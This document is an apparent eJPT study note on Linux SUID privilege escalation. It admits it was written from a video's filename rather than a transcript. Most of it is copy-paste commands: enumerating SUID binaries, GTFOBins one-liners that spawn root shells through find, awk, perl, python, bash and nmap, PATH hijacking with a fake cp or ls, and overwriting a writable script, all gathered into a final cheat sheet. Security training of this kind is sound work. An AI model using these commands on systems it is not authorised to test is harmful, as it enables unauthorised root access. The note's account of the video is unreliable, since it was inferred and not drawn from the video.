## What the video covers (Introduction / big picture)

Note: No transcript was provided. The following summary is based on the filename and standard eJPT/Linux privilege escalation content for SUID exploitation.

This video introduces exploiting SUID (Set-UID) binaries for local privilege escalation on Linux. It covers:
- What SUID is and why it’s dangerous when misconfigured
- How to enumerate SUID binaries systematically
- Quick-win exploitation via known GTFOBins entries (e.g., find, vim, nmap, awk, perl, bash)
- Analyzing custom SUID binaries with strings/ltrace/strace
- PATH hijacking when a SUID program calls external commands without absolute paths
- Verifying escalation and basic cleanup


## Flow (ordered)

1. Enumerate all SUID binaries on the system.
2. Triage the list: prioritize unusual locations (/usr/local, home dirs), developer/test tools, and known GTFOBins.
3. For known tools, try GTFOBins SUID techniques to spawn a root shell.
4. For unknown/custom binaries:
   - Inspect with strings to find system()/popen() or external commands and file paths.
   - Trace with ltrace/strace to catch command execution and libraries.
5. Exploit:
   - PATH hijacking if the program calls commands without absolute paths.
   - Writable scripts or configs invoked by the SUID binary.
6. Confirm escalation (id/whoami) and maintain the effective UID using -p where applicable.
7. Clean up: restore PATH and remove droppings in /tmp or other locations.


## Tools highlighted

- find (enumeration)
- ls, stat (permission check)
- strings (static inspection)
- ltrace, strace (runtime tracing)
- readelf/ldd (library/RPATH hints)
- Text editor or echo/printf for file crafting
- GTFOBins (reference)
- grep, sort, uniq for triage


## Typical command walkthrough (detailed, copy-paste friendly)

Enumeration (SUID/SGID for context)
```bash
# SUID binaries (bit 4000)
find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null

# Optional: exclude noisy snap paths
find / -perm -4000 -type f ! -path "/snap/*" -exec ls -la {} + 2>/dev/null

# SGID (bit 2000) – not SUID, but sometimes also useful
find / -perm -2000 -type f -exec ls -la {} + 2>/dev/null
```

Quick triage helpers
```bash
# Sort by directory to spot odd locations (/usr/local, /opt, home)
find / -perm -4000 -type f 2>/dev/null | awk -F/ '{print "/"$2}' | sort | uniq -c | sort -nr

# Look for likely interesting names
find / -perm -4000 -type f 2>/dev/null | egrep -i 'find|awk|perl|python|vim|vi|nmap|less|more|tar|cp|bash'
```

Check ownership/bit
```bash
# Confirm SUID and owner
ls -l /path/to/suspect
stat -c '%A %U %G %a %n' /path/to/suspect
```

GTFOBins “quick wins” (works when those binaries are SUID root)

- find
```bash
# If /usr/bin/find has SUID root:
# Prefer bash -p if available; /bin/sh -p may not exist on dash-based systems.
find . -exec /bin/bash -p -c 'id; whoami' \; -quit
```

- awk
```bash
awk 'BEGIN { system("/bin/bash -p") }'
```

- perl
```bash
perl -e 'exec "/bin/bash","-p";'
```

- python
```bash
python -c 'import os,pty; os.setuid(0); os.system("/bin/bash")'
# Alternative with interactive TTY
python -c 'import os,pty; os.setuid(0); pty.spawn("/bin/bash")'
```

- bash
```bash
# If /bin/bash is SUID root:
bash -p
```

- nmap (older versions with interactive mode)
```bash
nmap --interactive
# At the nmap prompt:
!bash -p
```

Note: Not all GTFOBins work on every distro/version; some binaries sanitize or drop privileges.

Analyze a custom SUID binary
```bash
# 1) Static hints
strings /path/to/suid_binary | egrep -i 'system|popen|execl|execve|/bin/|/usr/bin/|sh|bash'

# 2) Runtime calls to system()/exec* (shows arguments)
ltrace -f -o /tmp/ltrace.log /path/to/suid_binary
grep -iE 'system|popen|execl|execve' /tmp/ltrace.log || tail -n +1 /tmp/ltrace.log | less

# 3) Observe executed processes/files
strace -f -e execve,open,openat,access -o /tmp/strace.log /path/to/suid_binary
grep -E 'execve\(|open(at)?\(' /tmp/strace.log | tail -n 50

# 4) Libraries and RPATH/RUNPATH clues (sometimes useful)
readelf -d /path/to/suid_binary | egrep -i 'rpath|runpath'
ldd /path/to/suid_binary
```

Exploit PATH hijacking (when a SUID binary shells out to a command without an absolute path)
```bash
# Suppose ltrace/strings shows the SUID binary runs: system("cp /tmp/x /var/backup/x")
# and uses "cp" (no absolute path). We’ll hijack "cp" via PATH.

# 1) Create a malicious cp in /tmp (spawns a root shell)
cat > /tmp/cp << 'EOF'
#!/bin/sh
/bin/bash -p
EOF
chmod +x /tmp/cp

# 2) Prepend /tmp to PATH so our cp is found first
export OLD_PATH="$PATH"
export PATH=/tmp:$PATH

# 3) Run the SUID binary to trigger our payload
/path/to/suid_binary

# 4) You should get a root shell; verify:
id; whoami

# 5) Cleanup PATH
export PATH="$OLD_PATH"
rm -f /tmp/cp
```

Exploit writable script invoked by SUID wrapper
```bash
# Suppose strings/strace shows it runs /usr/local/bin/backup.sh
# Check if the script is writable:
ls -la /usr/local/bin/backup.sh

# If writable by our user or group:
printf '#!/bin/sh\n/bin/bash -p\n' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh

# Run the SUID binary to gain root shell via the modified script
/path/to/suid_binary
id; whoami
```

Verifying and stabilizing
```bash
# Confirm you have effective UID 0
id
# Keep root euid when spawning shells
/bin/bash -p
```

Notes on environment variables
- LD_PRELOAD/LD_LIBRARY_PATH are ignored for SUID programs by the dynamic loader (secure-execution mode). Don’t rely on these unless there is a specific misconfiguration that re-enables them.


## Practical tips

- Prefer bash -p to preserve effective UID 0; dash’s sh often lacks -p and may drop privileges.
- Always verify the SUID bit and owner: look for root-owned with -rws.
- Triage for unusual paths: /usr/local/bin, custom app dirs (/opt), and user directories are strong leads.
- Use ltrace first for quick wins on system()/popen() calls; fall back to strace if needed.
- PATH hijacking only works if the SUID binary calls commands without absolute paths and doesn’t sanitize PATH.
- Be cautious changing files that persist (e.g., writable scripts). Restore content in a real engagement; for labs this is fine.
- Keep an offline/printed GTFOBins list for SUID entries.
- If a GTFOBin doesn’t work, version or hardening may block it—pivot to analysis plus PATH/script hijacking.


## Minimal cheat sheet (one-screen flow)

```bash
# 1) Enumerate
find / -perm -4000 -type f ! -path "/snap/*" -exec ls -la {} + 2>/dev/null

# 2) Quick wins (examples)
# find (SUID)
find . -exec /bin/bash -p \; -quit
# awk (SUID)
awk 'BEGIN { system("/bin/bash -p") }'
# perl (SUID)
perl -e 'exec "/bin/bash","-p";'
# python (SUID)
python -c 'import os,pty; os.setuid(0); pty.spawn("/bin/bash")'
# bash (SUID)
bash -p

# 3) Analyze custom binary
strings /path/to/suid | egrep -i 'system|popen|/bin/|/usr/bin/'
ltrace -f -o /tmp/l.log /path/to/suid
strace -f -e execve,open,openat -o /tmp/s.log /path/to/suid

# 4) PATH hijack (if it calls 'cp', 'ls', etc. without full path)
echo -e '#!/bin/sh\n/bin/bash -p' > /tmp/ls; chmod +x /tmp/ls
export OLD_PATH="$PATH"; export PATH=/tmp:$PATH
/path/to/suid; id
export PATH="$OLD_PATH"; rm -f /tmp/ls

# 5) Writable script hijack (if invoked by SUID)
printf '#!/bin/sh\n/bin/bash -p\n' > /usr/local/bin/backup.sh; chmod +x /usr/local/bin/backup.sh
/path/to/suid; id
```

## Summary

Exploiting SUID binaries is a core Linux privilege escalation technique. Start by enumerating all SUID programs, triage for known GTFOBins or unusual/custom binaries, and attempt quick wins. For custom binaries, use strings, ltrace, and strace to discover unsafe external calls and file paths. Exploit via PATH hijacking when commands are executed without absolute paths, or by modifying writable scripts invoked by the SUID binary. Always verify root escalation, prefer bash -p to preserve privileges, and clean up artifacts after testing.